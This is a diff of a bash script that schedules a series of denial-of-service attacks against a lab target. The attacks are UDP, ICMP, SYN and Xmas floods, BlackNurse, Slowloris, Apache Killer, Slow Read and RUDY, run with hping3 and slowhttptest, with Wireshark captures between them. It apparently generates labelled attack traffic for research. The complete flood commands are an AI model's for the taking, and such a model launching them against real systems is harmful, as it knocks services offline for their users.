@@ -26,7 +26,7 @@ attack_log="/home/logs/udp.log"
 attack_duration=$((3*60)) # in seconds
 destination_ip=$machine13_ip
 destination_port=$machine13_port
-attack_script="hping3 --flood --udp -p "$destination_port" "$destination_ip""
+attack_script="hping3 --flood --udp -p $destination_port $destination_ip"
 
 attack $attack_type $capture_file $traceroute_log $attack_stats_log $attack_log $attack_duration $destination_ip $destination_port "$attack_script"
 
@@ -37,7 +37,7 @@ tshark -i $interface -w "/home/wiresharkTraces/Break1.pcap" -F pcap & pid_tshark
 #Wait for next attack
 sleep $((10*60))
 #Stop the Wireshark capture
-kill "$pid_tshark"
+kill $pid_tshark
 #Write to file
 echo "Break 1 is finished" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log
 
@@ -50,7 +50,7 @@ attack_log="/home/logs/SlowLoris.log"
 attack_duration=$((9*60)) # in seconds
 destination_ip=$machine13_ip
 destination_port=$machine13_port
-attack_script="slowhttptest -c 1000 -H -g -i 10 -r 200 -u http://"$destination_ip" -x 24 -p 3"
+attack_script="slowhttptest -c 1000 -H -g -i 10 -r 200 -u http://$destination_ip -x 24 -p 3"
 
 attack $attack_type $capture_file $traceroute_log $attack_stats_log $attack_log $attack_duration $destination_ip $destination_port "$attack_script"
 
@@ -61,7 +61,7 @@ tshark -i $interface -w "/home/wiresharkTraces/Break2.pcap" -F pcap & pid_tshark
 #Wait for next attack
 sleep $((6*60))
 #Stop the Wireshark capture
-kill "$pid_tshark"
+kill $pid_tshark
 #Write to file
 echo "Break 2 is finished" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log
 
@@ -75,7 +75,7 @@ attack_log="/home/logs/apacheKiller.log"
 attack_duration=$((16*60)) # in seconds
 destination_ip=$machine13_ip
 destination_port=$machine13_port
-attack_script="slowhttptest -R -g -c 1000 -a 10 -b 3000 -r 500 -t HEAD  -u http://"$destination_ip""
+attack_script="slowhttptest -R -g -c 1000 -a 10 -b 3000 -r 500 -t HEAD  -u http://$destination_ip"
 
 attack $attack_type $capture_file $traceroute_log $attack_stats_log $attack_log $attack_duration $destination_ip $destination_port "$attack_script"
 
@@ -86,7 +86,7 @@ tshark -i $interface -w "/home/wiresharkTraces/Break3.pcap" -F pcap & pid_tshark
 #Wait for next attack
 sleep $((15*60))
 #Stop the Wireshark capture
-kill "$pid_tshark"
+kill $pid_tshark
 #Write to file
 echo "Break 3 is finished" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log
 
@@ -100,7 +100,7 @@ attack_log="/home/logs/ping.log"
 attack_duration=$((5*60)) # in seconds
 destination_ip=$machine13_ip
 destination_port=$machine13_port
-attack_script="hping3 --flood -1 "$destination_ip""
+attack_script="hping3 --flood -1 $destination_ip"
 
 attack $attack_type $capture_file $traceroute_log $attack_stats_log $attack_log $attack_duration $destination_ip $destination_port "$attack_script"
 
@@ -111,7 +111,7 @@ tshark -i $interface -w "/home/wiresharkTraces/Break4.pcap" -F pcap & pid_tshark
 #Wait for next attack
 sleep $((7*60))
 #Stop the Wireshark capture
-kill "$pid_tshark"
+kill $pid_tshark
 #Write to file
 echo "Break 4 is finished" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log
 
@@ -125,7 +125,7 @@ attack_log="/home/logs/slowRead.log"
 attack_duration=$((13*60)) # in seconds
 destination_ip=$machine13_ip
 destination_port=$machine13_port
-attack_script="slowhttptest -c 1000 -X -g -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 -u http://"$destination_ip" -p 3"
+attack_script="slowhttptest -c 1000 -X -g -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 -u http://$destination_ip -p 3"
 
 attack $attack_type $capture_file $traceroute_log $attack_stats_log $attack_log $attack_duration $destination_ip $destination_port "$attack_script"
 
@@ -136,7 +136,7 @@ tshark -i $interface -w "/home/wiresharkTraces/Break5.pcap" -F pcap & pid_tshark
 #Wait for next attack
 sleep $((14*60))
 #Stop the Wireshark capture
-kill "$pid_tshark"
+kill $pid_tshark
 #Write to file
 echo "Break 5 is finished" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log
 
@@ -152,7 +152,7 @@ attack_log="/home/logs/blacknurse.log"
 attack_duration=$((10*60)) # in seconds
 destination_ip=$machine13_ip
 destination_port=$machine13_port
-attack_script="hping3 -1 --flood -C 3 -K 3 "$destination_ip""
+attack_script="hping3 -1 --flood -C 3 -K 3 $destination_ip"
 
 attack $attack_type $capture_file $traceroute_log $attack_stats_log $attack_log $attack_duration $destination_ip $destination_port "$attack_script"
 
@@ -163,7 +163,7 @@ tshark -i $interface -w "/home/wiresharkTraces/Break6.pcap" -F pcap & pid_tshark
 #Wait for next attack
 sleep $((3*60))
 #Stop the Wireshark capture
-kill "$pid_tshark"
+kill $pid_tshark
 #Write to file
 echo "Break 6 is finished" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log
 
@@ -177,7 +177,7 @@ attack_log="/home/logs/SYN_attack.log"
 attack_duration=$((7*60)) # in seconds
 destination_ip=$machine13_ip
 destination_port=$machine13_port
-attack_script="hping3 --flood -p "$destination_port" -S $destination_ip"
+attack_script="hping3 --flood -p $destination_port -S $destination_ip"
 
 attack $attack_type $capture_file $traceroute_log $attack_stats_log $attack_log $attack_duration $destination_ip $destination_port "$attack_script"
 
@@ -188,7 +188,7 @@ tshark -i $interface -w "/home/wiresharkTraces/Break7.pcap" -F pcap & pid_tshark
 #Wait for next attack
 sleep $((20*60))
 #Stop the Wireshark capture
-kill "$pid_tshark"
+kill $pid_tshark
 #Write to file
 echo "Break 7 is finished" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log
 
@@ -202,7 +202,7 @@ attack_log="/home/logs/RUDY.log"
 attack_duration=$((9*60)) # in seconds
 destination_ip=$machine13_ip
 destination_port=$machine13_port
-attack_script="slowhttptest -c 1000 -B -g -i 100 -r 200 -s 8192 -u http://"$destination_ip" -x 10 -p 3"
+attack_script="slowhttptest -c 1000 -B -g -i 100 -r 200 -s 8192 -u http://$destination_ip -x 10 -p 3"
 
 attack $attack_type $capture_file $traceroute_log $attack_stats_log $attack_log $attack_duration $destination_ip $destination_port "$attack_script"
 
@@ -213,7 +213,7 @@ tshark -i $interface -w "/home/wiresharkTraces/Break8.pcap" -F pcap & pid_tshark
 #Wait for next attack
 sleep $((6*60))
 #Stop the Wireshark capture
-kill "$pid_tshark"
+kill $pid_tshark
 #Write to file
 echo "Break 8 is finished" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log
 
@@ -227,6 +227,6 @@ attack_log="/home/logs/xmas.log"
 attack_duration=$((4*60)) # in seconds
 destination_ip=$machine13_ip
 destination_port=$machine13_port
-attack_script="hping3 --flood -p "$destination_port" -F -S -P -A -U -X -Y "$destination_ip""
+attack_script="hping3 --flood -p $destination_port -F -S -P -A -U -X -Y $destination_ip"
 
 attack $attack_type $capture_file $traceroute_log $attack_stats_log $attack_log $attack_duration $destination_ip $destination_port "$attack_script"
